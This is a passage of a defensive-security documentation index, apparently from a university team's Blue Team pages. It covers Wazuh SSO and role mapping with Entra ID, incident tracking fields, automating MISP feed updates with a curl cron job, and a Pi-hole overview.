Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#step-4-validate-sso","content":" 4.1. Login to the Wazuh dashboard and verify successful login with your Entra ID account.  4.2. Check and verify the assigned roles (permissions) and backend role.  ","version":"Next","tagName":"h2"},{"title":"Step 5: RBAC Role Mapping​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#step-5-rbac-role-mapping","content":" Note: • While Wazuh provides a GUI under Server Management -&gt; Security -&gt; Roles Mapping to assign users and roles, this interface does not replace the initial role mapping required in the roles_mapping.yml file (steps 2.4, 2.5, and 2.6 above). • For first-time setup, role mapping via roles_mapping.yml (step 2.4, 2.5) and the securityadmin.sh (step 2.6) tool is mandatory to bootstrap the connection between Entra ID roles and Wazuh internal roles. • After the initial SAML SSO integration is enabled, the Wazuh Dashboard GUI is then best suited, and therefore, it is used for ongoing role management.  In this technical guide, we have configured Role-Based Access Control (RBAC) for the following Wazuh roles using Entra ID groups:  Redback_Wazuh_Admin (already configured and validated in steps 1 – 4 above as part of the initial SSO enablement)Redback_Wazuh_Reader (configured in Step 5 below)Redback_Wazuh_Analyst (configured in Step 5 below)  ","version":"Next","tagName":"h2"},{"title":"5.1. Enable run_as: true in Wazuh Dashboard config file​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#51-enable-run_as-true-in-wazuh-dashboard-config-file","content":" • For ongoing role management via the Wazuh Dashboard GUI, edit the /usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml file. • Ensure the value of run_as is true.   ","version":"Next","tagName":"h3"},{"title":"5.2. Restart the Wazuh Dashboard service​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#52-restart-the-wazuh-dashboard-service","content":" systemctl restart wazuh-dashboard     ","version":"Next","tagName":"h3"},{"title":"5.3. Create Entra ID groups in the Entra ID portal.​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#53-create-entra-id-groups-in-the-entra-id-portal","content":"   ","version":"Next","tagName":"h3"},{"title":"5.4. Create new App Roles for the redback-wazuh-sso application.​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#54-create-new-app-roles-for-the-redback-wazuh-sso-application","content":"   ","version":"Next","tagName":"h3"},{"title":"5.5. Map the Entra ID groups to the corresponding Wazuh roles.​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#55-map-the-entra-id-groups-to-the-corresponding-wazuh-roles","content":"   ","version":"Next","tagName":"h3"},{"title":"5.6. Login to the Wazuh dashboard​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#56-login-to-the-wazuh-dashboard","content":" • Log n to the Wazuh dashboard at https://redback.it.deakin.edu.au/app/wz-home .  ","version":"Next","tagName":"h3"},{"title":"5.7. Create role​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#57-create-role","content":" • Create a custom role named Redback_Custom_ReadOnly.  Notes: • Redback_Custom_ReadOnly: Core read-only custom role mapped to users via backend roles. Apart from the all_access default built-in role, this is the custom role that enables access and read permissions to UI and indices, without which users will not be able to log in to Wazuh Dashboard. Ensure to map any new app role values from Entra ID to this Wazuh custom group for access to Wazuh Dashboard. • Admin does not need to be added to other roles separately — all_access covers it all.     ","version":"Next","tagName":"h3"},{"title":"5.8. Map to the custom role Redback_Custom_ReadOnly​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#58-map-to-the-custom-role-redback_custom_readonly","content":" • Map the Backend Roles (Entra App Role values) to Redback_Custom_ReadOnly.   ","version":"Next","tagName":"h3"},{"title":"5.9. Backend role mapping​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#59-backend-role-mapping","content":" • Assign/map the Backend Roles to the Wazuh roles based on the table below.  ","version":"Next","tagName":"h3"},{"title":"🔐 Role Assignment Table​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#-role-assignment-table","content":" Entra Group\tBackend Role (App Role Value)\tAssigned Wazuh Roles\tDescription / PurposeRedback_Wazuh_Admin_Group Add users to this group to grant Admin role access into Wazuh.\tRedback_Wazuh_Admin\tall_access\t🔧 Full administrative access across all management, features, indices, dashboards, and security settings Redback_Wazuh_Analyst_Group Add users to this group to grant Analyst role access into Wazuh.\tRedback_Wazuh_Analyst\tRedback_Custom_ReadOnly, readall_and_monitor, wazuh_ui_user, alerting_full_access, anomaly_read_access, reports_read_access, reports_instances_read_access\t📊 Analyze data, view dashboards, manage alerting rules, and view generated reports Redback_Wazuh_Reader_Group Add users to this group to grant Reader role access into Wazuh.\tRedback_Wazuh_Reader\tRedback_Custom_ReadOnly, readall_and_monitor, wazuh_ui_user\t👀 Read-only access to dashboards and data, limited to viewing only  • Outlined below are step-by-step screenshots demonstrating how to assign a Wazuh reserved role to a backend role. • For example, to assign alerting_full_access role, go to Roles, click on the role name, then navigate to Mapped users → Manage mapping → Add a backend role.   • After the role assignments are completed, it should look like as in the screenshots below:   ","version":"Next","tagName":"h3"},{"title":"Step 6: Validate RBAC​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#step-6-validate-rbac","content":" 6.1. Login to the Wazuh dashboard and verify successful login with your Entra ID account. 6.2. Check and verify the assigned roles (permissions) and backend role. 6.2.1. If a user has been added to the Redback_Wazuh_Analyst_Group group, verify the correct assigned roles based on the table in step 5.9.   6.2.2. If a user has been added to the Redback_Wazuh_Reader_Group group, verify the correct assigned roles based on the table in step 5.9.   ","version":"Next","tagName":"h2"},{"title":"Important Note​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#important-note","content":" • To create additional roles (e.g., Redback_Wazuh_Auditor, Redback_Wazuh_BackupOperator), simply repeat the process outlined in Step 5 (creation) and Step 6 (validation).  ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#conclusion","content":" With this configuration, Wazuh is securely integrated with Microsoft Entra ID using SAML SSO, enabling centralised identity management and RBAC enforcement for all Wazuh users at Redback Operations.  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Wazuh Integration with Microsoft Entra ID – SSO and Role-Based Access Control (RBAC) Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-enhancements/wazuh-sso-rbac#references","content":" https://documentation.wazuh.com/current/user-manual/user-administration/single-sign-on/administrator/microsoft-entra-id.html#wazuh-dashboard-configuration ","version":"Next","tagName":"h2"},{"title":"Wazuh Rules and Decoders","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules","content":"","keywords":"","version":"Next"},{"title":"Introduction to Wazuh​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#introduction-to-wazuh","content":" Wazuh is a powerful SIEM (Security Information and Event Management) platform/tool that monitors, analyses and responds to security threats in a variety of different environments. It collects and analyses data from multiple sources to provide a comprehensive threat detection incident response.  ","version":"Next","tagName":"h2"},{"title":"Overview of rules and decoders​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#overview-of-rules-and-decoders","content":" Wazuh uses rules and decoders to enable high quality success. Rules are predefined or custom configurations that detect specific patterns or behaviors in logs and initiate alerts or actions when they are detected. Decoders, on the other hand, parse, and structure raw log data so that Wazuh's rules engine can read and analyse it.  ","version":"Next","tagName":"h2"},{"title":"Rules and decoders: In relation to Redback Operations’ projects​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#rules-and-decoders-in-relation-to-redback-operations-projects","content":" ","version":"Next","tagName":"h2"},{"title":"Project 1: VR SunCycle and SmartBike​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#project-1-vr-suncycle-and-smartbike","content":" Custom solutions would be required for VR game data integration. Wazuh mainly deals with security-related logs, so handling VR game data would require the development of custom loggers within the game or the use of APIs that display game events as loggable data. Custom decoding mechanisms and rules for game-related security flaws may also be required. The process of integrating exercise bike metrics into Wazuh is similar. As Wazuh does not interact with exercise bike data by default, a middleware or interface layer would be required for converting bike metrics into loggable events. The data would then be analysed for anomalies or security-related insights using custom decoding configurations and rules – similarly as mentioned above.  ","version":"Next","tagName":"h3"},{"title":"Project 2: Wearable Tech sensor​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#project-2-wearable-tech-sensor","content":" Wazuh is not designed to interact directly with GPS tracking data by default. Integrating GPS tracking data requires the development of custom decoders to parse the GPS device's unique data format, as well as middleware to bridge the communication gap between the device and Wazuh. This entails interpreting GPS data, converting it to a loggable format, and configuring rules to analyse relevant data.  ","version":"Next","tagName":"h3"},{"title":"Project 3 and 4: (Sport Performance Analysis and Data Warehousing)​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#project-3-and-4-sport-performance-analysis-and-data-warehousing","content":" As these two projects work with data and logs, the same implementations can be used of creating custom decoders to read the data. Custom rules can be integrated to monitor access patterns, suspicious activity and data integrity as a whole.  ","version":"Next","tagName":"h3"},{"title":"Alternatives and other Solutions​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#alternatives-and-other-solutions","content":" Development of Middleware: Create middleware or API (Application Programming Interface) to translate the device’s data into readable logs for Wazuh Custom Integration: Creating custom solutions to connect devices and Wazuh, allowing data transformation for security analysis. External monitoring: By applying specialised monitoring solutions, or platforms designed specifically for the respective devices - we can integrate them with Wazuh to match data for overall security insights.  ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Wazuh Rules and Decoders","url":"/redback-documentation/docs/cybersecurity/Blue Team/ids-and-wazuh/wazuh-rules#references","content":" Wazuh, Home Page, Wazuh Inc 2023 (accessed 11/24/2023) -https://wazuh.com/platform/overview/ GeeksforGeeks, Introduction to Wazuh, GeeksforGeeks Pty Ltd (accessed 11/25/2023) -https://www.geeksforgeeks.org/introduction-to-wazuh/ Wazuh, How it works, Wazuh Inc 2023 (accessed 11/25/2023) -https://documentation.wazuh.com/current/user-manual/capabilities/log-data-collection/how-it-works.html ","version":"Next","tagName":"h2"},{"title":"Supporting Forms (Downloads)","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/forms","content":"Last updated by: T_Apperley, Last updated on: '03/12/2024' Last updated by: T_Apperley, Last updated on: '03/12/2024' Supporting Forms (Downloads) Incident Response and Records Find below the documents referenced in the Incident Form and Tracker Details page. Cyber Security Incident DocumentCyber Incident Response Plan 2023-2024","keywords":"","version":"Next"},{"title":"Automating Feed Updates in MISP","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/Automating_feeds_on_MISP","content":"","keywords":"","version":"Next"},{"title":"1.0 Introduction​","type":1,"pageTitle":"Automating Feed Updates in MISP","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/Automating_feeds_on_MISP#10-introduction","content":" By default, Feeds in MISP do not automatically update. We’d have to manually go into List Feeds and then Fetch and Store All Feed Data again. MISP has an internal schedule task feature which can come in handy when automating feed updates, but there are lots of caveats that come with using this feature. It’s recommended to simply create cron jobs.    To avoid this, we’ll set up automation using an API call and a cron job.  ","version":"Next","tagName":"h2"},{"title":"1.1 Generating an API Key​","type":1,"pageTitle":"Automating Feed Updates in MISP","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/Automating_feeds_on_MISP#11-generating-an-api-key","content":" Navigate to Administration &gt; List Auth Keys in the MISP interface. Click Add Authentication Key and provide a name (e.g., “Automation”). Set Allowed IP: For this demo, we’re just going to go ahead and set it to 0.0.0.0/0, which will allow any IP address. Important: Copy and save the API key securely. Once you select ‘I’ve noted down my API key,’ you won’t be able to retrieve the API key again.  ","version":"Next","tagName":"h2"},{"title":"1.2 Setting Up a Cron Job​","type":1,"pageTitle":"Automating Feed Updates in MISP","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/Automating_feeds_on_MISP#12-setting-up-a-cron-job","content":" Create a script to call the API using the API key provided with the command below:  bash curl -X POST --insecure --header &quot;Authorization: &lt;API_KEY&gt;&quot; --header &quot;Accept: application/json&quot; --header &quot;Content-Type: application/json&quot; https://&lt;YOUR_MISP_ADDRESS&gt;/feeds/fetchFromAllFeeds  Replace &lt;API_KEY&gt; with your actual API key.Make the script executable:    Going back to MISP web interface and refresh the jobs page, you’ll notice new feeds are being fetched.    Now we proceed to assign a cronjob with the following line of code.  crontab -e.      Copy and place the same command into the cron job file;  bash curl -X POST --insecure --header &quot;Authorization: \\&lt;API_KEY\\&gt;&quot; --header &quot;Accept: application/json&quot; --header &quot;Content-Type: application/json&quot; https://\\&lt;YOUR_MISP_ADDRESS\\&gt;/feeds/fetchFromAllFeeds  This cron job will make the API call out to MISP every day in the morning to fetch the latest feeds.  ","version":"Next","tagName":"h2"},{"title":"1.3 Possible troubleshooting Tips​","type":1,"pageTitle":"Automating Feed Updates in MISP","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/Automating_feeds_on_MISP#13-possible-troubleshooting-tips","content":" Self-Signed Certificate Issues: Use the --insecure flag in curl commands to bypass warnings.  curl -k ...  Adding our insecure flag will tell curl to disregard that alert.  Permission Errors with Docker: Ensure your user is in the docker group:  sudo usermod -aG docker $USER  Feed Update Issues: Ensure the API key has sufficient permissions and the cron job is correctly configured.  ","version":"Next","tagName":"h2"},{"title":"1.4 Conclusion​","type":1,"pageTitle":"Automating Feed Updates in MISP","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/Automating_feeds_on_MISP#14-conclusion","content":" MISP is a powerful platform for managing and sharing threat intelligence. By automating feed updates and leveraging its API, you can integrate it into your security operations for enriched threat detection and response. ","version":"Next","tagName":"h2"},{"title":"Incident Form and Trackers Details","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form","content":"","keywords":"","version":"Next"},{"title":"Purpose and Scope of the Policy​","type":1,"pageTitle":"Incident Form and Trackers Details","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form#purpose-and-scope-of-the-policy","content":" The purpose of this document is to detail the various information that will be collected in order to ensure that data of incidents are accurately and reliably collected. The scope will cover the Incident Form and the Incident Tracker.  ","version":"Next","tagName":"h2"},{"title":"Incident Tracker​","type":1,"pageTitle":"Incident Form and Trackers Details","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form#incident-tracker","content":" The Incident Tracker contains the basic required data for identifying and managing incidents, which would be handled in the incident sheet.  Incident Form =https://docs.google.com/forms/d/e/1FAIpQLSew9gGm9P20o3q3Jg_tMQD0oqJJjEDeQ-iOHz-j1b8ZcLWI8Q/viewform?usp=sf_link Incident Sheet =https://docs.google.com/spreadsheets/d/12jbbfF7W08v5nt71Yem1DG6xAYcG5v2pxNItIYBle2E/edit?resourcekey#gid=1034913739  ","version":"Next","tagName":"h2"},{"title":"Incident Form (At Escalation)​","type":1,"pageTitle":"Incident Form and Trackers Details","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form#incident-form-at-escalation","content":" The form has select fields which need to be populated immediately when an incident is being escalated:  Incident Name/Title = Name of the Incident Date and Time of Incident = Immediate Date and Time of Incident occurrence (not date and time of escalation). Affected Asset/Username/Data = The targeted entity (multiple entities mention the name of the most sensitive/priority entity followed by etc... [eg:-test@deakin.edu.au, etc....) Severity = The severity of the Incident Priority = Time period within which the incident needs to be resolved (often aligns with Severity level and/or affected assets) Incident Category = Type of Cyber Incident Affected Project = The project in the company affected by the incident. Incident Escalator = The person reporting the incident.  ","version":"Next","tagName":"h3"},{"title":"Incident Form (Post Escalation)​","type":1,"pageTitle":"Incident Form and Trackers Details","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form#incident-form-post-escalation","content":" Alongside the above fields, the sheet storing the collected data contain additional fields that will be filled post escalation directly by the cyber security team/analyst:  Incident ID = A unique ID to identify incidents. Expected Incident Resolution Date and Time = Based on Priority, date and time at which the incident should be resolved. Incident Resolved = Yes/No question tracking incident resolution. Incident Resolution Date and Time = Date and Time when incident was resolved. Resolution Reason = Summarized reason on resolving issue (problem solution). Additional Comments = Additional information for noting incident. In addition, due to information found during investigation analysis, only these fields within the sheet can be changed after escalation by the cyber security team if required: Date and Time of Incident Incident Category Severity and Priority can be changed only after discussion and agreement with the relevant stakeholders and authority in relation to what’s dictated in the Cyber Incident Response Plan, regardless of whether data provided was by accident or not.  ","version":"Next","tagName":"h3"},{"title":"Incident Record​","type":1,"pageTitle":"Incident Form and Trackers Details","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form#incident-record","content":" The Incident Record provides a comprehensive view on the investigation carried out for the incident, which may continuously, even post resolution, be updated with various findings such as evidence, involved threats, carried out actions etc....  The Incident Record is to be accessed and filled only by the cyber security team and authorized analysts. Other stakeholders (affected project members, company board, legal entities) are allowed to only view the document.  The Incident Record template can be found on the following page  The following information need to be filled:  Incident ID = Unique code for identifying incidents Incident Title = Name of the incident Date and Time of Incident = Date and Time of detection of incident Date and Time of Escalation = Date and Time of escalation of incident Timezone = Timezone of incident when first escalated Incident Severity = Severity of the Incident Incident Priority = Priority Category of the incident Incident Category = Type of cyber incident Refer Incident Form and/or Cyber Incident Response Plan for list of Severity, Priority and Category Affected Project = Project impacted by the incident Affected Assets = Entities owned by the company/project that are impacted by the incident Incident Manager = Names of Cyber Security Analyst assigned to incident and Incident Escalator Incident Tags = Quick identifiers Incident Summary = Brief summary on the cause of the incident and initial actions carried out. Incident Timeline = A summarized detail of all events directly related to the incident, including but not limited to; attack events, initial steps taken by employees to contain and eradicate the attack, changes in states of affected assets, compromise times etc... Each event must precede the date and time per line. Actions taken in Incident = Actions taken by company members to identify, analyze, contain and eradicate threats in the incident must be mentioned in point form. Chronological order of actions must be maintained as much as possible with comprehensive detail. Status of actions required to be taken per playbook/incident response plan = Based on provided playbooks and/or the company incident response plan, select actions are required for incidents. These actions need to be noted down and then answered whether they were carried out and the result (if no, why not must be mentioned). Incident Findings = Evidence, Events and other information not initially showcased when incident was escalated and results of investigations are to be placed here. Threat Actors and Vectors = Identified responsible parties for the incident (malware family, APT etc....) as well as the mode of delivery (external hardware, Internet, email etc...) and affected vulnerabilities (if any) must be mentioned here. Each line must have a basic detail followed by sub points of extensive information. Additional Details = Information regarding the various questions that the Incident Response Plan requires to be answered alongside additional findings such as supporting evidence, involved indirect parties etc.....can be mentioned here. Incident Resolution = Date and Time of complete Incident Resolution should be mentioned at the beginning. Steps taken = These are steps taken to resolve and confirm resolution of the incident. Select steps may also be part of the “Actions taken in Incident” section which can involve restoration of operations, restoration of backups, blacklisting etc... Incident Impact and Outcome = The impact of the incident in terms of company loss (financial/data/time/power/operations etc....) must be mentioned. Each impacts corresponding outcome (loss of customers, damaged resources, recreation of system etc....) should be mentioned here. Improvements in system post incident resolution, relevant trainings, even identified potential benefits and opportunities can also be mentioned. Legal and Governing Entities = This table contains a series of Yes/No questions regarding escalation to stakeholders and governing bodies. Refer the Cyber Incident Response Plan for required escalations.  It is important to note that select fields may have their data changed over time as incident investigations and analysis continue. However, ensure that the relevant incident data in the record do not conflict with the data of the corresponding row in the incident tracker sheet.  ","version":"Next","tagName":"h2"},{"title":"Supporting Documentation​","type":1,"pageTitle":"Incident Form and Trackers Details","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form#supporting-documentation","content":" Cyber Incident Response Plan.  ","version":"Next","tagName":"h2"},{"title":"Additional Comments​","type":1,"pageTitle":"Incident Form and Trackers Details","url":"/redback-documentation/docs/cybersecurity/Blue Team/incident-docs/incident-form#additional-comments","content":" While the templates documented here and its sections remain the vital areas of answer and overrides other templates provided, it is important to also answer the questions posed by the Cyber Incident Response Plan whenever possible, especially using template for Incident Review and Post Analysis as seen in the Plan’s templates.  Legal and Governing bodies informed have select questions that the company security teams will need to answer and possess relevant evidence as detailed in the Cyber Incident Response Plans and other government regulations. Google Forms is the current preferred platform for hosting incident collection form due to its flexibility in collection of required data. Microsoft Forms will require the Pro version. Incident Tags will likely be transferred to document metadata section or dropped. ","version":"Next","tagName":"h2"},{"title":"Introduction","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/pi-research","content":"","keywords":"","version":"Next"},{"title":"Components:​","type":1,"pageTitle":"Introduction","url":"/redback-documentation/docs/cybersecurity/Blue Team/pi-research#components","content":" • Internet: The source of internet traffic.  • Pi-hole: A software installed on the Raspberry Pi that acts as a DNS server. It intercepts DNS requests and blocks advertisements and tracking domains.  • Base OS: The operating system running on the Raspberry Pi. This is usually a Linux distribution like Debian.  • Router: A network device that forwards internet traffic to connected devices. The Pi-hole is typically configured as a secondary DNS server on the router.  • Devices: Devices on the network that make DNS requests, such as computers, smartphones, and tablets.  ","version":"Next","tagName":"h2"},{"title":"Flow:​","type":1,"pageTitle":"Introduction","url":"/redback-documentation/docs/cybersecurity/Blue Team/pi-research#flow","content":" When a device on the network wants to access a website, it sends a DNS request to the router.The router, configured to use the Pi-hole as a secondary DNS server, forwards the request to the Pi-hole.The Pi-hole checks its blocklist. If the requested domain is on the blocklist, it returns a dummy IP address.The device can't connect to the website, effectively blocking the advertisement or tracker.  ","version":"Next","tagName":"h2"},{"title":"Key points:​","type":1,"pageTitle":"Introduction","url":"/redback-documentation/docs/cybersecurity/Blue Team/pi-research#key-points","content":" • DNS: The Pi-hole operates by intercepting DNS requests, which are used to translate domain names into IP addresses.  • Blocklists: The Pi-hole uses blocklists that contain domains associated with advertisements, trackers, and malware. These blocklists can be customized.  • Filtering: The Pi-hole can block various types of internet content, including advertisements, trackers, and malware.  • Network-wide: The Pi-hole can be used to protect all devices on a network.  Benefits of Using Pi-hole  Pi-hole offers several advantages to enhance your online experience by blocking ads and trackers at the network level. Here are the key benefits:  Ad Blocking for All Devices: Pi-hole provides network-wide ad-blocking, so once it’s set up on your router via a Raspberry Pi, all devices connected to your network are protected. This means no need to install ad-blockers on each device individually, saving you time and effort.Faster Browsing: By blocking ads and tracking scripts, Pi-hole reduces unnecessary data transfer, which can lead to faster browsing speeds. Websites load more quickly since they don’t need to display ads, improving your overall internet experience.Enhanced Privacy: Pi-hole helps protect your privacy by blocking tracking domains that collect information about your online behavior. It reduces the amount of data shared with advertisers and third parties, giving you greater control over your personal information.Cost-Effective Solution: Pi-hole runs on a Raspberry Pi, which is an affordable, low-power device. It’s an inexpensive solution to block ads and trackers, offering a great return on investment without negatively affecting network performance.Customizable and Open-Source: As open-source software, Pi-hole allows you to customize it to meet your specific needs. You can adjust blocklists and implement features like DNS-over-HTTPS for additional security and privacy.Simple Setup and Maintenance: Setting up Pi-hole on a Raspberry Pi is easy, and once it’s running, it requires minimal upkeep. The user-friendly web interface makes it simple to manage settings, view logs, and make adjustments as needed.Protects All Devices Without Extra Software: Since Pi-hole operates at the network level, all devices on your network are automatically protected. There’s no need to install ad-blocking software on each device, whether it’s a phone, computer, or smart device.  Interface of pi-hole:  here you can see pihole has already started blocking some of the domains that are blacklisted.  In conclusion, Pi-hole is a cost-effective, efficient, and easy-to-manage solution that provides comprehensive ad-blocking, privacy protection, and faster internet browsing for all devices on your network. ","version":"Next","tagName":"h2"},{"title":"MISP Setup Guide for Ubuntu Desktop","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide","content":"","keywords":"","version":"Next"},{"title":"","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide##","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-1","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-2","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-3","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-4","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-5","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-6","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-7","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-8","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-9","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-10","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-11","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-12","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-13","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-14","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-15","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu Desktop","url":"/redback-documentation/docs/cybersecurity/Blue Team/MISP/MISP_Setup_Guide#-16","content":"   ","version":"Next","tagName":"h2"},{"title":"​","type":1,"pageTitle":"MISP Setup Guide for Ubuntu 